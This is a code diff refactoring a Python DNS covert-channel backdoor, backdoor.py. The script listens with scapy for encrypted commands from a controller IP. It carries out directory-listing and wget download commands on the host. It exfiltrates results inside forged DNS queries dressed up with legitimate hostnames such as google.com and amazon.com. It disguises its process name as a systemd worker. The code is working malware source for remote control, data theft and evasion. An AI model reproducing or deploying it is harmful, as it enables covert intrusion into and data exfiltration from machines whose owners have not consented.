@@ -8,63 +8,61 @@
 import os
 from random import randint
 import argparse
-from ipaddress import ip_address, IPv6Address
-from sys import exit
+import sys
 
 # Custom Modules
 from utils.encryption import StreamEncryption
 from utils.shell import LIST, WGET
+from utils.validation import validate_ipv4_address, validate_nic_interface
 
 # Third Party Libraries
 from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send
-from setproctitle import setproctitle, getproctitle
+from setproctitle import setproctitle
 
 
-# Command Line Arguments
-parser = argparse.ArgumentParser("./backdoor.py")
-parser.add_argument("controller_ip", help="The IPv4 address of the controller host.")
-parser.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
-parser.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
-args = parser.parse_args()
+PARSER = argparse.ArgumentParser("./backdoor.py")
+PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
+PARSER.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
+PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
+ARGS = PARSER.parse_args()
 
 
-# Validate Arguments
-if not validate_ipv4_address(args.controller_ip):
-    print(f"Invalid IPv4 Address: '{args.controller_ip}'")
-    exit(1)
+if not validate_ipv4_address(ARGS.controller_ip):
+    print(f"Invalid IPv4 Address: '{ARGS.controller_ip}'")
+    sys.exit(1)
 
-if not validate_ipv4_address(args.backdoor_ip):
-    print(f"Invalid IPv4 Address: '{args.backdoor_ip}'")
-    exit(1)
-    
-if not validate_nic_interface(args.interface):
-    print(f"Network Interface does not exist: '{args.interface}'")
-    exit(1)
+if not validate_ipv4_address(ARGS.backdoor_ip):
+    print(f"Invalid IPv4 Address: '{ARGS.backdoor_ip}'")
+    sys.exit(1)
+
+if not validate_nic_interface(ARGS.interface):
+    print(f"Network Interface does not exist: '{ARGS.interface}'")
+    sys.exit(1)
 
 
 # Global Variables
-CONTROLLER_IP = args.controller_ip
-BACKDOOR_IP = args.backdoor_ip
-NETWORK_INTERFACE = args.interface
-e = StreamEncryption()
+CONTROLLER_IP = ARGS.controller_ip
+BACKDOOR_IP = ARGS.backdoor_ip
+NETWORK_INTERFACE = ARGS.interface
+ENCRYPTION_HANDLER = StreamEncryption()
 
 # List of legit hostnames
-hostnames = ["play.google.com", 
-            "pixel.33across.com", 
-            "signaler-pa.clients6.google.com",
-            "www.youtube.com", 
-            "www.google.ca", 
-            "www.amazon.ca", 
-            "www.amazon.com",
-            "safebrowsing.googleapis.com",
-            "upload.wikimedia.org",
-            "hhopenbid.pubmatic.com"]
+hostnames = ["play.google.com",
+             "pixel.33across.com",
+             "signaler-pa.clients6.google.com",
+             "www.youtube.com",
+             "www.google.ca",
+             "www.amazon.ca",
+             "www.amazon.com",
+             "safebrowsing.googleapis.com",
+             "upload.wikimedia.org",
+             "hhopenbid.pubmatic.com"]
 
 
 # Initialize the encryption context.
-e.read_nonce("data/nonce.bin")
-e.read_secret("data/secret.key")
-e.initialize_encryption_context()
+ENCRYPTION_HANDLER.read_nonce("data/nonce.bin")
+ENCRYPTION_HANDLER.read_secret("data/secret.key")
+ENCRYPTION_HANDLER.initialize_encryption_context()
 
 
 class DirectoryNotFound(Exception): pass
@@ -79,21 +77,24 @@ def get_random_hostname():
 def receive_dns_command(pkt):
     msg_len = pkt[UDP].len
     ciphertext = bytes(pkt[UDP].payload)[0:msg_len]
-    msg_bytes = e.decrypt(ciphertext)
+    msg_bytes = ENCRYPTION_HANDLER.decrypt(ciphertext)
     msg = msg_bytes.decode("utf-8")
     return msg
 
 
 def send_dns_query(query):
-    # Send the query.
+    """
+        Send dns query.
+    """
     send(query, verbose=0)
 
 
 def forge_dns_query(data: str):
-    # Choose random legitimate hostname.
+    """
+        Forge dns query.
+    """
     hostname = get_random_hostname()
-    # Encrypt data
-    encrypted_data = e.encrypt(data.encode("utf-8"))
+    encrypted_data = ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
     if len(encrypted_data) > 255:
         print("ERROR: Can't fit more than 255 bytes in TXT record!")
         print("Truncating data...")
@@ -104,10 +105,16 @@ def forge_dns_query(data: str):
 
 
 def hide_process_name(name: str):
+    """
+    
+    """
     setproctitle(name)
 
 
 def execute_list_command(file_path: str) -> bool:
+    """
+    
+    """
     try:
         contents = list_directory_contents(file_path)
     except DirectoryNotFound:
@@ -118,13 +125,16 @@ def execute_list_command(file_path: str) -> bool:
     for name in contents:
         data += name
         data += " "
-    data = data.strip() # Remove last whitespace
+    data = data.strip()
     query = forge_dns_query(data=data)
     send_dns_query(query)
     return True
 
 
 def execute_wget_command(url: str, filepath: str) -> bool:
+    """
+    
+    """
     if not os.path.isdir(filepath):
         query = forge_dns_query(data="ERRORMSG: Directory not found or filepath is not a directory.")
         send_dns_query(query)
@@ -136,23 +146,25 @@ def execute_wget_command(url: str, filepath: str) -> bool:
 
 
 def list_directory_contents(file_path: str) -> list:
+    """
+    
+    """
     if not os.path.isdir(file_path):
         raise DirectoryNotFound
     return os.listdir(file_path)
 
 
 def packet_handler(pkt):
-    # Do nothing if not the correct packet.
+    """
+    
+    """
     if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
         return
-    # Decrypt the command.
     command = receive_dns_command(pkt)
     print(f"Received: {command}")
-    # Check command and perform operation
     argv = command.split(" ")
     argc = len(argv)
     if argc == 2:
-        # Process the command.
         if argv[0] == LIST:
             execute_list_command(argv[1])
             return
@@ -162,7 +174,5 @@ def packet_handler(pkt):
 
 
 if __name__ == "__main__":
-    # Hide process name.
     hide_process_name("systemd-userwork-evil")
-    # Start listening for packets.
     sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)
